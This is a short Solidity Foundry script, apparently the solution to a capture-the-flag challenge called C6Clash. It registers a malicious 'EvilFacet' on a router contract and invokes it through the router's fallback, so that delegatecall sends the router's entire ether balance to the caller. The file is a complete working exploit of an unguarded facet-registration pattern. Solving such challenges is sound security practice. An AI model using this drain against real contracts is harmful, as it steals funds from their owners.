// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C6Clash.sol";

/// Register a malicious facet, then invoke it through the router: under
/// delegatecall `address(this)` is the router, so its whole balance is sent to
/// the caller.
contract EvilFacet {
    function pwn() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

contract SolveC6 is Script {
    function run() external {
        Router router = ClashSetup(vm.envAddress("SETUP")).router();
        vm.startBroadcast();
        EvilFacet evil = new EvilFacet();
        router.setFacet(EvilFacet.pwn.selector, address(evil));
        EvilFacet(address(router)).pwn();     // fallback -> delegatecall(evil)
        vm.stopBroadcast();
    }
}
